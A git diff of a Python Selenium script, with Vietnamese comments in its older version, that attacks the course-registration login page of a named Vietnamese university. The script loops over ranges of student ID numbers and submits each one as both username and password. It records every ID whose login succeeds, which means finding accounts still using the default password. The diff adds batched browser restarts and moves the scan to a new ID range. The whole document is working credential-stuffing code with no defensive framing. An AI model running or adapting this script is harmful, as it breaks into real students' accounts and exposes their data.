@@ -2,66 +2,43 @@ from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 
-# khai bao bien browser
 options = webdriver.ChromeOptions()
 options.add_experimental_option("detach", True)
 
-count = 0
-f = open("1900.txt", "a")
+BATCH_SIZE = 50
 
-# nhập khoảng msv cần check
-for x in range(19000000, 19002500):
-    if count == 0:
-        browser = webdriver.Chrome(options=options)
-        browser.get("https://daotao.vnu.edu.vn/dkmh/login.asp")
-        username = browser.find_element(By.ID, "txtLoginId")
-        username.send_keys(x)
+def login_and_write_result(browser, username, password, file):
+    browser.get("https://daotao.vnu.edu.vn/dkmh/login.asp")
 
-        password = browser.find_element(By.ID, "txtPassword")
-        password.send_keys(x)
+    username_element = browser.find_element(By.ID, "txtLoginId")
+    password_element = browser.find_element(By.ID, "txtPassword")
 
-        password.send_keys(Keys.ENTER)
-        url = browser.current_url
-        if url == "https://daotao.vnu.edu.vn/dkmh/login.asp?errlogin=err":
-            print("login fail " + str(x))
-            count = count + 1
-        else:
-            f.write(str(x) + "\n")
+    username_element.send_keys(username)
+    password_element.send_keys(password)
+    password_element.send_keys(Keys.ENTER)
+
+    url = browser.current_url
+    if url != "https://daotao.vnu.edu.vn/dkmh/login.asp?errlogin=err":
+        file.write(f"{username}\n")
+    
+    # log
+    print(f"Tried {username}")
+    
+if __name__ == "__main__":
+    count = 0
+    output = open("1800-2.txt", "a")
+    chrome = webdriver.Chrome(options=options)
+
+    for msv in range(18000500, 18001000):
+        if count >= BATCH_SIZE:
+            chrome.close()
+            print("..reload..")
+            chrome = webdriver.Chrome(options=options)
+            login_and_write_result(chrome, msv, msv, output)
             count = 0
-            browser.close()
-
-    elif count >= 30:
-        username = browser.find_element(By.ID, "txtLoginId")
-        username.send_keys(x)
-
-        password = browser.find_element(By.ID, "txtPassword")
-        password.send_keys(x)
-
-        password.send_keys(Keys.ENTER)
-        url = browser.current_url
-        if url == "https://daotao.vnu.edu.vn/dkmh/login.asp?errlogin=err":
-            print("login fail " + str(x))
+            count += 1            
         else:
-            f.write(str(x) + "\n")
-        print("reload")
-        count = 0
-        browser.close()
+            login_and_write_result(chrome, msv, msv, output)
+            count += 1
 
-    else:
-        username = browser.find_element(By.ID, "txtLoginId")
-        username.send_keys(x)
-
-        password = browser.find_element(By.ID, "txtPassword")
-        password.send_keys(x)
-
-        password.send_keys(Keys.ENTER)
-        url = browser.current_url
-        if url == "https://daotao.vnu.edu.vn/dkmh/login.asp?errlogin=err":
-            print("login fail " + str(x))
-            count = count + 1
-        else:
-            f.write(str(x) + "\n")
-            count = 0
-            browser.close()
-f.close()
-print("done")
+    output.close()
